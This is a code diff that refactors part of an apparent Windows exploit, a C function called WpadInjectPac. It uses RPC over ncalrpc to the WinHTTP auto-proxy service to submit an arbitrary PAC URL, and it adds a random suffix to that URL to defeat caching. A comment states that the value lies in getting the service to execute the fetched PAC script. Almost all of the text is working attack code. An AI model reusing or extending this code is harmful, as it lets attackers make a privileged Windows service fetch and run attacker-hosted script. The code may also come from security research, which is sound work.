@@ -1,7 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
-
 #include "IWinHttpAutoProxySvc_h.h"
 
 #pragma comment(lib, "rpcrt4.lib")
@@ -50,17 +49,15 @@ void __RPC_USER midl_user_free(void __RPC_FAR* ptr) { // https://docs.microsoft.
 ////////
 
 RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
-    DWORD Int = 0;
     INT nReply = 0;
-    DWORD WinHttpStatusCode = 0;
-    LPWSTR Protocol = L"ncalrpc";
+    uint32_t dwInt = 0;
+    uint32_t dwWinHttpStatusCode = 0;
     RPC_WSTR StringBinding = NULL;
     RPC_STATUS RpcStatus = RPC_S_OK;
-    DWORD dwWaitResult = WAIT_FAILED;
     RPC_BINDING_HANDLE hRpcBinding = NULL;
-    HANDLE pNameResTrkRecordHandle = NULL;
-    WCHAR AutoConfigUrl[5000] = { 0 };
-    wchar_t PacUrlRandom[200] = { 0 };
+    HANDLE hNameResTrkRecord = NULL;
+    wchar_t AutoConfigUrl[5000] = { 0 };
+    //wchar_t PacUrlRandom[200] = { 0 };
     RPC_ASYNC_STATE RpcAsyncState = { 0 };
     tagProxyResolveUrl ProxyResolveUrl = { 0 };
     WINHTTP_PROXY_RESULT_EX ProxyResult = { 0 };
@@ -69,16 +66,11 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
     // Make a unique variation of the specified PAC URL to avoid WPAD cache issues
 
-    _snwprintf_s(
-        PacUrlRandom,
-        ARRAYSIZE(PacUrlRandom),
-        ARRAYSIZE(PacUrlRandom),
-        L"?%lld",
-        __rdtsc()
+    _snwprintf_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), ARRAYSIZE(AutoConfigUrl), L"%ws?%lld", PacUrl, __rdtsc()
     );
 
-    wcscpy_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrl);
-    wcscat_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrlRandom);
+    //wcscpy_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrl);
+    //wcscat_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrlRandom);
     DebugLog(L"... target PAC URL: %ws", AutoConfigUrl);
 
     ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
@@ -110,7 +102,7 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
        4. Make the RPC call to GetProxyForUrl within the WPAD service and wait for its completion via the event object in its RPC async handle
     */
 
-    RpcStatus = RpcStringBindingComposeW(0, (RPC_WSTR)Protocol, 0, 0, 0, &StringBinding); // Create the initial RPC string binding handle over ncalrpc protocol
+    RpcStatus = RpcStringBindingComposeW(0, (RPC_WSTR)L"ncalrpc", 0, 0, 0, &StringBinding); // Create the initial RPC string binding handle over ncalrpc protocol
 
     if (RpcStatus == RPC_S_OK) {
         RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding); // Create the primary RPC binding handle
@@ -142,10 +134,10 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                         &SessionOptions,
                         0,
                         NULL,
-                        &Int,
+                        &dwInt,
                         &ProxyResult,
-                        &pNameResTrkRecordHandle,
-                        &WinHttpStatusCode
+                        &hNameResTrkRecord,
+                        &dwWinHttpStatusCode
                     );
 
                     DebugLog(L"... GetProxyForUrl returned (async)");
@@ -155,12 +147,12 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                 }
                 RpcEndExcept
 
-                dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);
+                uint32_t dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);
 
                 if (RpcAsyncState.u.hEvent != NULL) { // Unclear why this would occur, perhaps the RPC server or OS may closed it autonomously?
                     CloseHandle(RpcAsyncState.u.hEvent);
                 }
-
+                
                 if (dwWaitResult == WAIT_OBJECT_0) {
                     DebugLog(L"... RPC call to WPAD GetProxyForUrl signalled async state event.");
                     RpcAsyncCompleteCall(&RpcAsyncState, &nReply);
